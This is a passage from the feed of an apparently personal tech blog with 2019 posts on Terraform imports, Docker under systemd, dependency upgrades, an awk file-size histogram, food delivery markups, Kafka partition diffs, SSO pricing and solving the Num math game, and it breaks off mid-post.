<p>I imagine for most people it’s a chore but I find the entire process zen-like. I take something that was a mess and clean it up while learning something new. My approach has been to create a placeholder resource and then do a “terraform import” to fetch the properties. Then I go through a series of “terraform plan”s to reconcile the differences.</p>

<p>What I wish was for Terraform to allow me to point it to a cloud resource and then have it generate the corresponding HCL that I can then migrate over to the .tf files. I can see why this isn’t built in: the entire point of Terraform is to link various resources together so just seeing a static set of properties for a given resource won’t tie them all together. At the same time, I’d rather have the option to see my entire resource in HCL and then decide what I want to remove, replace, or keep. Had I used Terraform from the beginning this wouldn’t have been a problem but for those of us that are migrating a ton of legacy resources it would be a big help.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Upgrade your libraries</title>
   <link href="http://dangoldin.com/2019/11/04/upgrade-your-libraries/"/>
   <updated>2019-11-04T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2019/11/04/upgrade-your-libraries</id>
   <content:encoded><![CDATA[
<p>This blog is <a href="https://github.com/dangoldin/blog.dangoldin.com">hosted</a> on GitHub and built using <a href="https://jekyllrb.com/">Jekyll</a>. Jekyll is a simple static site generator that’s been working well for me and was flexible enough to allow me to switch the entire site over to <a href="https://amp.dev/">AMP</a>. Unfortunately, the switch to AMP led to the site generation becoming significant slower due to the CSS-inlining requirement. Two years ago I started profiling and <a href="http://dangoldin.com/2017/11/23/improving-jekyll-generation-speed-for-amp-pages/">dropped the site generation time</a> down to about 15 seconds from over 4 minutes by generating the CSS once and then reusing it for all future pages.</p>

<p>Earlier this year I noticed that my build times dropped even further, down to 4 seconds. Part of the drop was the switch to a new computer but the primarily driver was upgrading each of the libraries. Jekyll improved significantly over the past 2 years and coupled with the improved hardware caused a nearly 4x improvement in speed.</p>

<p>We often fall into the trap of installing some open source code, getting it set up, and then promptly forgetting about it. In the meantime, that code has a life of its own and continues to grow and evolve. If you don’t have a process in place to audit and upgrade your libraries it’s well worth introducing one. Sometimes you have to deal with breaking changes and sometimes the code is slower but most upgrades are smooth and often lead to improvements in speed and functionality.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>QR codes in China</title>
   <link href="http://dangoldin.com/2019/11/02/qr-codes-in-china/"/>
   <updated>2019-11-02T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2019/11/02/qr-codes-in-china</id>
   <content:encoded><![CDATA[
<p>I’m fascinated by the way mobile works in China. Based on everything I read it seems China is far ahead of the US in the way technology has been absorbed in the day-to-day fabric of society. I’m not making the case that that’s actually a better way to be but more of an observation of how different daily life can be when technology is embraced in nearly all areas. This is much easier with China with more centralized control and a few companies, namely Tencent and Alibaba, that have monopolies over every device.</p>

<p>The latest is a <a href="https://a16z.com/2019/10/30/the-power-of-qr-codes/">post</a> on the A16Z blog highlight how QR codes are used in China. They range from being used to purchase toilet paper in public restrooms to booking a by-the-minute gym to renting a phone charger. The QR codes are just a means here and rest on a strong micropayments foundation but it’s difficult to imagine such a system existing in the US. I’m tempted to visit China just to see what a society built around mobile looks and feels like.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Computer history memos</title>
   <link href="http://dangoldin.com/2019/10/29/computer-history-memos/"/>
   <updated>2019-10-29T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2019/10/29/computer-history-memos</id>
   <content:encoded><![CDATA[
<p>I’m a fan of tech industry history and came across a neat trove of <a href="https://sriramk.com/memos">memos</a> compiled by <a href="https://twitter.com/sriramk">Sriram Krishnan</a>. The memos cover a wide time period and are first party accounts by the people actually involved. It’s easy to judge historical decisions with the gift of knowledge but reading these teleports you back to the past and gives you an appreciation for the challenges they faced.</p>

<p>I only wish there were more of these memos floating around. Seminal ones usually make their way in the public domain one way or another but there’s a huge trove of second-tier memos, notes, and emails that would provide tech historians a trove of information if only they became accessible.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Deplying Docker using systemd</title>
   <link href="http://dangoldin.com/2019/10/28/deplying-docker-using-systemd/"/>
   <updated>2019-10-28T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2019/10/28/deplying-docker-using-systemd</id>
   <content:encoded><![CDATA[
<p>A few months ago in a burst of inspiration I converted a bunch of my side projects to run inside Docker. Unfortunately, I didn’t do the follow up work of actually creating a Kubernetes cluster and instead came up with a ridiculously hacky process to get them running. I created a simple shell script that would just build and run a Docker image and have just been running it inside a screen session.</p>

<p>This worked surprisingly well. The only problem was that every time the instance was rebooted the screen sessions died and I had to SSH into it in order to restart the scripts. Earlier today I had another instance reboot and decided to finally do something about it. The solution I ended up with was to just bundle the aforementioned shell script into a systemd file and configure it to run at startup. It’s been a few hours and so far so good and delay the inevitable move to Kubernetes by a few more months.</p>

<figure>
  <figcaption>run.sh</figcaption>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">(</span>docker <span class="nb">rm test</span> <span class="o">||</span> <span class="nb">true</span><span class="o">)</span> <span class="o">&amp;&amp;</span> docker build <span class="nt">-t</span> <span class="nb">test</span>:latest <span class="nb">.</span> <span class="o">&amp;&amp;</span> docker run <span class="nt">--env-file</span> env.list <span class="nt">--name</span> <span class="nb">test</span> <span class="nt">-p</span> 8001:8000 <span class="nt">-i</span> <span class="nb">test</span>:latest</code></pre></figure>

</figure>

<figure>
  <figcaption>/etc/systemd/system/test.service</figcaption>

<figure class="highlight"><pre><code class="language-text" data-lang="text">[Unit]
Description=Test service.

[Service]
#Type=simple
WorkingDirectory=/root/test
ExecStart=/bin/bash /root/test/run.sh
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target</code></pre></figure>

</figure>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>GitHub's security automation</title>
   <link href="http://dangoldin.com/2019/10/26/githubs-security-automation/"/>
   <updated>2019-10-26T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2019/10/26/githubs-security-automation</id>
   <content:encoded><![CDATA[
<p>I have a variety of old projects up on GitHub and recently noticed pull requests being opened from “dependabot” to fix security vulnerabilities in old requirements files. Turns out it’s a <a href="https://help.github.com/en/github/managing-security-vulnerabilities/configuring-automated-security-fixes">new feature</a> offered by GitHub that scans repos and submits patches to upgrade insecure versions. This is a great idea - there’s very little chance that I’d go through my old and unmaintained repos to upgrade their dependencies but I’d definitely approve and merge a PR that upgrades a few of my libraries.</p>

<p>GitHub is incredibly well positioned to launch a new product line focused on security. They recently acquired <a href="https://thenextweb.com/security/2019/09/19/github-acquires-semmle-to-help-developers-spot-security-vulnerabilities/">Semmle</a> that further identifies vulnerabilities and a massive market for GitHub. It can be as simple as enabling the scan in a repo’s settings and having it automatically monitored and probed for vulnerabilities. Right now it seems to happen on a set interval but it can easily expand to occuring at a pull request level. Imagine having a security scan run every time a pull request is opened - that would be a huge win to companies, developers, and the security of the web.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>File size histogram via the command line</title>
   <link href="http://dangoldin.com/2019/10/20/file-size-histogram-via-the-command-line/"/>
   <updated>2019-10-20T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2019/10/20/file-size-histogram-via-the-command-line</id>
   <content:encoded><![CDATA[
<img src="http://dangoldin.com/assets/static/images/file-size-distribution-shell-script.png" alt="File size histogram using the command line" width="951" height="294" layout="responsive"/>

<p>I’m a sucker for a good shell command and recently discovered (via <a href="https://superuser.com/questions/565443/generate-distribution-of-file-sizes-from-the-command-prompt">StackOverflow</a>) the most complex one yet - a one liner to generate a histogram of file sizes within a directory. The sizes are in powers of two but it’s a great way to get some simple summary statistics of files inside a directory. I still find awk mystifying to write but nearly every advanced shell command uses awk in some way. Most engineers thee days have a bias for a traditional scripting language but it’s still amazing what an awk one-liner can do.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">find <span class="nb">.</span> <span class="nt">-type</span> f <span class="nt">-print0</span> | xargs <span class="nt">-0</span> <span class="nb">ls</span> <span class="nt">-l</span> | <span class="nb">awk</span> <span class="s1">'{ n=int(log($5)/log(2)); if (n&lt;10) { n=10; } size[n]++ } END { for (i in size) printf("%d %d\n", 2^i, size[i]) }'</span> | <span class="nb">sort</span> <span class="nt">-n</span> | <span class="nb">awk</span> <span class="s1">'function human(x) { x[1]/=1024; if (x[1]&gt;=1024) { x[2]++; human(x) } } { a[1]=$1; a[2]=0; human(a); printf("%3d%s: %6d\n", a[1],substr("kMGTEPYZ",a[2]+1,1),$2) }'</span></code></pre></figure>

]]></content:encoded>
 </entry>
 
 <entry>
   <title>Bypassing the incognito browser check on nytimes.com</title>
   <link href="http://dangoldin.com/2019/10/13/bypassing-the-incognito-browser-check-on-nytimescom/"/>
   <updated>2019-10-13T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2019/10/13/bypassing-the-incognito-browser-check-on-nytimescom</id>
   <content:encoded><![CDATA[
<img src="http://dangoldin.com/assets/static/images/nytimes-incognito-check.png" alt="The NY Times incognito check message" width="510" height="335" layout="responsive"/>

<p>For as long as the NY Times had a free article limit you were able to bypass it using incognito mode but it seems this is no longer the case. Earlier today I tried checking out <a href="https://www.nytimes.com/2019/10/13/nyregion/14th-street-cars-banned.html">an article</a> in incognito mode and received a prompt to “Log in or create a free New York Times account to continue reading in private mode.” The loophole was fun while it lasted and glad they finally patched it up - despite the fact that I no longer have unlimited articles.</p>

<p>I was a bit curious to see how this was implemented and it turns out that this logic is served in the JavaScript loaded for every article page rather than relying on a standalone script. Chrome has a pretty nice ability to block requests to specific URLs or domains and blocking the request to that story’s JavaScript ( https://www.nytimes.com/vi-assets/static-assets/story-b62c89165cd61167dc0c.js) prevented the prompt from showing up. It’s likely this heavy-handed approach blocked a chunk of the site’s functionality but my goal was to see what I can do to bypass the incognito check.</p>

<p>It’s nice to know that it’s technically possible to bypass this incognito check but it’s not simple and has to be done separately for each site given the unique JavaScript URL. It’s a step in the right direction and I’m glad they’re finally taking this more seriously. To eliminate this vector they can have the incognito check in-lined into the initial page load but so long as it’s done in JavaScript there will always be a workaround.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Online food delivery markups: Seamless vs UberEats vs DoorDash</title>
   <link href="http://dangoldin.com/2019/10/12/online-food-delivery-markups-seamless-vs-ubereats-vs-doordash/"/>
   <updated>2019-10-12T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2019/10/12/online-food-delivery-markups-seamless-vs-ubereats-vs-doordash</id>
   <content:encoded><![CDATA[
<p>There are a variety of online food ordering and delivery services out there but lately I’ve been a fan of DoorDash since the delivery time seems to be both quicker and more consistent than the others. Yesterday I ordered some <a href="http://www.linglongxuannj.com/">Chinese food</a> and noticed that the restaurant had added a receipt with prices that differed from what DoorDash charged. In hindsight I’m not surprised but did feel a bit misled since DoorDash has separate service and delivery that I figured covered the actual service. After I overcame the feeling of being tricked I thought it would be interesting to see how whether other delivery services are doing the same thing and by how much. I looked at the items I ordered across DoorDash, UberEats, and Seamless/GrubHub. Solely looking at the prices it looks as if DoorDash has the highest markup, followed up UberEats, and then Seamless/GrubHub. Surprisingly, the cheapest item (Hot &amp; Sour Soup) hsa no markup across any of the services and the percentage markup across all of them drops as the item price increases.</p>

<p>My takeaway is that DoorDash is the most expensive but you’re paying for that reliable and quick delivery.</p>

<table class="table"><thead><tr><th>Item</th><th>Original</th><th>Seamless / GrubHub</th><th>UberEats</th><th>DoorDash</th><th>Seamless / GrubHub % Markup</th><th>UberEats % Markup</th><th>DoorDash % Markup</th></tr></thead><tbody><tr><td>Hot &amp; Sour Soup (Small)</td><td>$4</td><td>$4</td><td>$4</td><td>$4</td><td>0.00%</td><td>0.00%</td><td>0.00%</td></tr><tr><td>Sauteed Triple Vegetable</td><td>$10</td><td>$11</td><td>$11.50</td><td>$12</td><td>10.00%</td><td>15.00%</td><td>20.00%</td></tr><tr><td>General Tso's Chicken</td><td>$12</td><td>$13</td><td>$13.50</td><td>$14</td><td>8.33%</td><td>12.50%</td><td>16.67%</td></tr><tr><td>Xin Jiang Style Lamb</td><td>$19</td><td>$20</td><td>$21</td><td>$21</td><td>5.26%</td><td>10.53%</td><td>10.53%</td></tr></tbody></table>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Combining Excel and the command line</title>
   <link href="http://dangoldin.com/2019/10/11/combining-excel-and-the-command-line/"/>
   <updated>2019-10-11T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2019/10/11/combining-excel-and-the-command-line</id>
   <content:encoded><![CDATA[
<p>I was lucky that my first job caused me to learn Excel. I was also lucky that subsequent jobs helped me discover the power of the command line. Combining both of these made me incredibly productive and are an amazing tool to have in your arsenal.</p>

<p>As engineers, we’re paid for solving problems. While most software engineering problems require designing and building for the long term there’s a whole category of problems that are just “throwaway work” and the goal is to get to a solution as quickly as possible and move on. Excel and the command line are designed for this.</p>

<p>Some of these problems are investigations. For example going through log files to parse out and understand what’s happening. In that case you can write a few shell commands to do a quick job of filtering and cleaning the data - for example grep, cut, and sort - which can then be passed into Excel for deeper investigation or visualization.</p>

<p>Another common problem is needing to generate the same command multiple times that then needs to be executed. One use case is doing a few hundred database queries that all follow the same format. It’s possible to do this via a script or in many cases the command line but I’ve found it to be easier to do in a spreadsheet. You get immediate feedback on whether your approach works and it’s straightforward to then copy and paste it into whatever tool you need.</p>

<p>It’s easy to fall into the trap of writing code to solve every problem but combining shell scripts and Excel combine to have a ton of built in functionality that they’re perfect for many one off tasks.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Visualizing my Twitter archive - 2019 edition</title>
   <link href="http://dangoldin.com/2019/10/07/visualizing-my-twitter-archive-2019-edition/"/>
   <updated>2019-10-07T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2019/10/07/visualizing-my-twitter-archive---2019-edition</id>
   <content:encoded><![CDATA[
<p>GitHub sent me an alert this past weekend that a bunch of my repos were using old libraries that had security vulnerabilities. Nearly all of them were due to my usage of an old version of the <a href="https://pypi.org/project/requests/">requests</a> library. Updating those was as simple as updating the requirements.txt file to the new version.</p>

<p>One of these repos, <a href="https://github.com/dangoldin/twitter-archive-analysis">twitter-archive-analysis</a>, is my most popular project on GitHub so I thought I might as well revisit it and see if I could both address the vulnerabilities and get it running again. Upgrading the packages was straightforward but there are very few things more humbling than looking at the code you’ve written years ago. Twitter changed the format of the archive from JSON to CSV since the last time I ran the code and as part of the upgrade I did a little bit of cleanup. The <a href="https://github.com/dangoldin/twitter-archive-analysis/blob/master/analyze.py">code</a> is up on GitHub and I’ve included the visualizations it generated below highlighting my Twitter behavior over the years.</p>

<ul class="thumbnails">
  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/2019-by-hour.png" alt="Tweets sent by hour" width="800" height="600" layout="responsive"/>
      <p>I tweet late in the evenings and nights.</p>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/2019-by-dow.png" alt="Tweets sent by day of week" width="800" height="600" layout="responsive"/>
      <p>Weekends, but especially Sundays, are my busiest Twitter time.</p>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/2019-by-month.png" alt="Tweets sent by month" width="800" height="600" layout="responsive"/>
      <p>Not a ton here other than I haven't been tweeting as much recently.</p>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/2019-by-month-dow.png" alt="Tweets sent by month and day of week" width="800" height="600" layout="responsive"/>
      <p>Not much here but a cool visualization.</p>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/2019-by-month-length.png" alt="Average length of a tweet by month" width="800" height="600" layout="responsive"/>
      <p>My tweets have gotten longer over the years but I'm still not hitting the 280 character limit.</p>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/2019-by-month-type.png" alt="Type of tweet sent by month" width="1200" height="600" layout="responsive"/>
      <p>Tough to tell what's going on here but I'm trying to look at the ways I engage with Twitter over time.</p>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/2019-by-month-type-stacked.png" alt="Type of tweet sent by month - normalized" width="800" height="600" layout="responsive"/>
      <p>This is a much nicer way of seeing that lately I've been much more about replying than tweeting.</p>
    </div>
  </li>
</ul>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Make sure you're understood</title>
   <link href="http://dangoldin.com/2019/10/06/make-sure-youre-understood/"/>
   <updated>2019-10-06T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2019/10/06/make-sure-youre-understood</id>
   <content:encoded><![CDATA[
<p><a href="https://twitter.com/rnoweber/status/1180519525885759488">
    <img src="http://dangoldin.com/assets/static/images/understood.jpg" alt="Thoughts vs understanding" width="668" height="680" layout="responsive"/>
</a></p>

<p>While browsing Twitter I saw a simple visualization that spoke to me. Communication is what makes us human and good communication is critical to strong teams. Historically, I’ve definitely fallen in assuming that when I spoke what people understood was exactly what I thought and was both surprised and disappointed when that wasn’t the case.</p>

<p>That diagram is an oversimplification but it gets the point across. It’s an incredibly valuable skill to be able to translate your thoughts into the exact words that can be understood by others, especially extemporaneously. As with any skill, some people are able to do it naturally while others need to invest significant time and effort to be effective. An example of the former is <a href="https://law.marquette.edu/facultyblog/2017/03/alexander-hamilton-as-attorney/">Alexander Hamilton</a> who was “able to speak extemporaneously for hours, all the while uttering grammatically correct sentences and perfectly formed paragraphs.” The other extreme was me when I started my career - I had a ton of thoughts going on in my mind at once and struggled conveying it in a way that was understood, especially without preparation. My first few jobs required me to present which improved my ability to communicate but the real improvement came from both writing and managing.</p>

<p>There’s nothing like writing to clarify and refine my thoughts. Writing forces me to go beyond thoughts and translate them into prose which have a precise meaning. Seeing concrete words and sentences force me to confront the manifestation of my thoughts and consider how they will be interpreted and understood. It’s an amazing forcing function to go back to the drawing board and reformulate my thoughts into something crisper and more coherent.</p>

<p>Managing allowed me to grow significantly in my empathy and is now a key part in how I communicate. Every time I speak I try to think about the audience - their mindset, their knowledge, their experience - and combine that knowledge with my goals to craft a message. It doesn’t always work but putting yourself in someone else’s shoes is critical in making sure your message is understood in the intended way.</p>

<p>I don’t think I’ll ever be able to speak for hours on end but having that as a target is a great driver and motivator for improvement. Everyone has their own style and I believe it’s more effective to lean into it, warts and all, than it is to try to embrace something new. The end goal of communication is to be understood and it’s up to us to find and develop our approach.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Upgrading pip packages within a Dockerfile</title>
   <link href="http://dangoldin.com/2019/10/03/upgrading-pip-packages-within-a-dockerfile/"/>
   <updated>2019-10-03T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2019/10/03/upgrading-pip-packages-within-a-dockerfile</id>
   <content:encoded><![CDATA[
<p>I have an old project, <a href="http://makersalley.com">makersalley.com</a>, that used to run on an old version of Python (2.7) and an archaic version of Django (1.4). Earlier this year I overhauled it to run on a newer version of Django (1.11) and Dockerized the entire setup which required all sorts of changes and library fixes.</p>

<p>Last night, I took it one step further by upgrading it to the latest versions of both Python (3.7) and Django (2.2). The most difficult part was figuring out how to upgrade to the latest versions while being tied down to Docker. For example, changing the Python version in the Dockerfile caused many of the packages in requirements.txt to not build but because they were all executed within Docker I had to get the entire requirements.txt fixed before that step would succeed. Similarly, it wasn’t clear which versions of the packages in the requirements.txt depended on one another and upgrading all of them blindly would have been a fool’s errand. It also turned out that one package, MySQL-python, was not available in Python 3+.</p>

<p>The ideal workflow for me would have been to upgrade the Python version first, install the latest version of Django, and then go through and upgrade each of the pip packages one at a time resolving issues along the way. This approach was not possible using Docker and a requirements.txt file. I could have come up with a minimal Dockerfile and then entered the container to do the individual upgrades but that didn’t seem worth and instead I did everything through a virtualenv.</p>

<p>Somewhat surprisingly, updating the code itself was quick and easy and only required changing about 130 lines which were primarily Python 2.7 vs 3.7 syntax errors.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Visualizing Kafka partition changes</title>
   <link href="http://dangoldin.com/2019/10/01/visualizing-kafka-partition-changes/"/>
   <updated>2019-10-01T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2019/10/01/visualizing-kafka-partition-changes</id>
   <content:encoded><![CDATA[
<p>Earlier this week we scaled up our Kafka cluster to take advantage of more availability zones and increase the replication for some of our key topics. After making sure the new brokers joined the existing cluster we needed to redo the partitioning to take advantage of these newly available brokers.</p>

<p>I’m sure there are better and more modern tools out there but we’ve been using <a href="https://github.com/SiftScience/kafka-assigner">SiftScience’s kafka-assigner</a>. Rather than being a naive partitioning it looks at the existing assignments and optimizes the new assignment to minimize the number of moves while striving to keep the partitions evenly distributed across all brokers.</p>

<p>The script is simple to run - you give it the topic and the desired replication factor and it generates the new partition assignments via JSON that can then be passed into Kafka’s built in <a href="https://cwiki.apache.org/confluence/display/KAFKA/Replication+tools#Replicationtools-4.ReassignPartitionsTool">partition reassignment tool</a>.</p>

<p>As part of our testing we wanted to verify that the new assignments made sense by quickly looking at the differences but the task was made difficult since the original assignment was printed in a random order. This made a standard diff difficult to do so I ended up building a small tool to sort the JSON and then visualize the differences.</p>

<p>The code is up on <a href="https://github.com/dangoldin/js-tools">GitHub</a> and the tool is available at <a href="https://dangoldin.github.io/js-tools/#tab-kafka-partition-diff">https://dangoldin.github.io/js-tools/#tab-kafka-partition-diff</a>. It’s not the fanciest but is a simple solution to a simple problem. I wish the tool itself did a better job of highlighting the differences but that’s another project.</p>

<img src="http://dangoldin.com/assets/static/images/kafka-partition-diff-vis.png" alt="Kafka partition difference visualizer" width="1224" height="749" layout="responsive"/>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>SSO and SAAS pricing</title>
   <link href="http://dangoldin.com/2019/09/28/sso-and-saas-pricing/"/>
   <updated>2019-09-28T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2019/09/28/sso-and-saas-pricing</id>
   <content:encoded><![CDATA[
<img src="http://dangoldin.com/assets/static/images/dropbox-pricing.png" alt="Dropbox business pricing" width="604" height="831" layout="responsive"/>

<p>For a very long time I wondered why SSO was always listed as a premium feature across nearly every enterprise software pricing page but no more! When you’re small it’s simple to manage permissions and the costs of screwing up are far smaller. Large companies, on the other hand, have complex organization structures with hundreds of employees that use a wide range of applications and access controls are a real concern. It’s possible to manage that through a herculean manual effort but it’s so much easier to just pay someone to solve the problem for you. Along similar lines, it’s valuable to minimize the amount of SAAS services used across the organization to reduce both the complexity and the cost although these days it feels like a fool’s errand.</p>

<p>It’s surprising how many third party services a typical midsize tech (but every company is tech!) company uses these days. This ranges from cloud providers (AWS) to version control (Github) to storage (Dropbox)  to communication (Slack) and workflow (Atlassian) tools. And the list above is just the basics - there are a ton of other tools that teams use that all require a proper access control policy. Each of these has their own rules and permissions to manage and it’s inevitable that something slips by if managed manually.</p>

<p>I’ll end this with some examples to highlight the difference in pricing between the SSO and non-SSO option across a few services.</p>

<ul>
  <li><strong><a href="https://github.com/pricing">GitHub</a></strong>: Non SSO is $9/user/month. SSO isn’t even priced publicly but seems to be $21/user/month.</li>
  <li><strong><a href="https://www.dropbox.com/business/pricing">Dropbox</a></strong>: Non SSO is $12.50/user/month. SSO is $20/user/month.</li>
  <li><strong><a href="https://www.atlassian.com/software/jira/pricing">Atlassian</a></strong>: Non SSO is $7/user/month. SSO requires a <a href="https://www.atlassian.com/software/access/pricing">separate addon</a> that starts at $3/user/month but drops with scale.</li>
</ul>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Free speech and the First Amendment</title>
   <link href="http://dangoldin.com/2019/09/23/free-speech-and-the-first-amendment/"/>
   <updated>2019-09-23T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2019/09/23/free-speech-and-the-first-amendment</id>
   <content:encoded><![CDATA[
<p>I recently finished <a href="https://www.amazon.com/gp/product/B00AAYF8WG/ref=ppx_yo_dt_b_d_asin_title_o06?ie=UTF8&amp;psc=1">The Great Dissent</a> which describes the thought process Supreme Court Justice <a href="https://en.wikipedia.org/wiki/Oliver_Wendell_Holmes_Jr.">Oliver Wendell Holmes Jr</a> went through as he changed the interpretation of the First Amendment and free speech in the United States. These days we all take the scope of free speech for granted and assume its a static part of our democracy but it went through multiple iterations and will likely continue to do so - something I didn’t even realize.</p>

<p>Justice Holmes wrote his dissent in 1919 which laid the foundation for the modern interpretation of free speech. Before then it was significantly handicapped. For example, censorship was common before the 20th century as well as the heavy restrictions around public speeches and gatherings. Even when they were legal, you were still accountable for what was said which was up to the interpretation of protective and jingoistic courts. Unsurprisingly, this led to many limiting what they said in order to avoid reprisal.</p>

<p>Over the course of the 20th century the interpretation changed to not penalize the speaker and instead follow the rule of “clear and present danger” when determining if something should be truly limited. This led to stronger opposition and more thoughtful conversations which I like to think led to a healthier and more tolerant world.</p>

<p>These days we see pundits referencing free speech as if it’s a static entity but it has and will continue to evolve. What we define as free speech now will be different in 50 years. It’s difficult to imagine it changing but laws invariably change along with society.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Goldilocks and the three implementations</title>
   <link href="http://dangoldin.com/2019/09/16/goldilocks-and-the-three-implementations/"/>
   <updated>2019-09-16T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2019/09/16/goldilocks-and-the-three-implementations</id>
   <content:encoded><![CDATA[
<p>While browsing Twitter I came across the following tweet that resonated:</p>

<amp-twitter width="609" height="274" layout="responsive" data-tweetid="1173706283859341312">
</amp-twitter>

<p>A common refrain I have is that the best engineers are not the ones that write the most code but are instead making decisions that reduce the amount of code that needs to be written in the future. This tweet speaks to that since very often an implementation will either be too simple to support a future use or be over-implemented to support a potential future use case. The truth is often somewhere in between.</p>

<p>That’s why business and commercial context is incredibly valuable to an engineering team and why, for the most part, the closer an engineer is to the problem the better the overall solution. This is also a big reason why startups can out-build larger companies. They have fewer layers of translations in between the problem and the product that’s meant to solve it.</p>

<p>The solution here is to eliminate as much friction between engineers and the problem being solved. The goal isn’t to understate the problem which will lead to an implementation that solves the immediate problem but isn’t flexible enough to grow with the problem opportunity. Similarly, overstating the problem will lead to an implementation that lacks flexibility due to its complexity.</p>

<p>This is very similar to Goldilocks and the Three Bears - the first approach is wrong in one direction, the second is wrong in the opposite direction, and the last approach is the one that’s “just right.”</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Google Sheets explore functionality</title>
   <link href="http://dangoldin.com/2019/09/15/google-sheets-explore-functionality/"/>
   <updated>2019-09-15T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2019/09/15/google-sheets-explore-functionality</id>
   <content:encoded><![CDATA[
<p>For the past few years I’ve been tracking a variety of daily metrics - ranging from sleep, to what I eat and drink, to my mood - in a Google spreadsheet. I have an annual tradition of analyzing and visualizing the data but I never go beyond the simple summary statistics. I always mean to do a deeper analysis but inevitably just run a script I barely touched in the past few years.</p>

<p>At the same time, I keep seeing the prompt from Google Sheets to try out their new “Explore” functionality so I decided to give it a shot and see if surfaced any interesting insights. It’s extremely simple to use and if you know what you’re looking for a great way to quickly get answers and visualize your information. For example, typing in “Histogram of Time Slept” gets you a plot containing exactly what you wanted.</p>

<img src="http://dangoldin.com/assets/static/images/google-explore-duration-time-slept.png" alt="Time slept histogram" width="1029" height="631" layout="responsive"/>

<p>The above made it easier to get what I wanted so I had high hopes for the “Analysis” functionality which I hoped would surface something novel. Instead, it seems it just ran through all the data and chose the appropriate chart depending on the data type and cardinality. For example, it generated the time slept histogram above but a pie chart for my moods.</p>

<img src="http://dangoldin.com/assets/static/images/google-explore-time-slept-by-date.png" alt="Time slept by date" width="948" height="707" layout="responsive"/>

<p>Part of the challenge is that most of the interesting data is semi structured and I’d need to do a variety of transformations to make it easier for Sheets to work with. Overall, I’m impressed with how simple and quick to do the visualizations but also disappointed in the depth of the analysis.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Solving Num: A combinatoric math game</title>
   <link href="http://dangoldin.com/2019/09/14/solving-num-a-combinatoric-math-game/"/>
   <updated>2019-09-14T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2019/09/14/solving-num-a-combinatoric-math-game</id>
   <content:encoded><![CDATA[
<img src="http://dangoldin.com/assets/static/images/num-level-68-combined.png" alt="Num puzzle unsolved and solved" width="1108" height="985" layout="responsive"/>

<p>I don’t play games on my phone but one game I keep going back to is “<a href="https://apps.apple.com/us/app/num-insanely-hard-math-game/id861791129">Num</a>” - an “insanely hard math game.” The premise is pretty simple - you have a few numbers that you need to combine, using the four basic math operations, so it computes to a specific number.</p>

<p>The levels start off simple but it gets more difficult with a lot of trial and error at the higher levels. They’re no longer simple expressions that can be evaluated fairly linearly but instead are solved by using fairly complex intermediate values.</p>

<p>I enjoy the process of solving these problems but decided to challenge myself to write a program that can solve these sorts of problems. Last night I was able to get a crude solution working that’s able to solve a 6-number problem in about 5 minutes on my laptop. The next challenge is speeding this to be even quicker but even the crude solution took a few attempts to get right.</p>

<p>The approach I took was a somewhat intelligent brute force. While it’s still fresh I wanted to share the attempts to highlight my thought process and the difficulties with each failed attempt.</p>

<h3 id="attempt-1">Attempt 1</h3>

<p>Idea here was to simply get all the number permutations and alternate them with all combinations of the operators - for example “1 + 4 - 5 * 6 / 4 + 1” - and then run them through Python’s eval to see how far I could get. I knew full well this would not solve all types of problems due to not being able to control the order of operations but I just wanted to get a starting point.</p>

<h3 id="attempt-2">Attempt 2</h3>

<p>At this point I wanted to handle the order of operations issue from the first attempt and figured it would be easier to do that if I switched to a <a href="https://en.wikipedia.org/wiki/Reverse_Polish_notation">Reverse Polish Notation</a> (RPN). The intuition here was to simplify the expressions I’d need to generate by not having to worry about the parentheses. This required implementing an RPN evaluator but I found a <a href="https://blog.klipse.tech/python/2016/09/22/python-reverse-polish-evaluator.html">simple one online</a>. Similar to the first attempt, this approach was still not able to represent every type of expression but it was much easier to work with. An example of an expression generated with this approach is “1 2 9 8 17 3 / + * - *”.</p>

<h3 id="attempt-3">Attempt 3</h3>

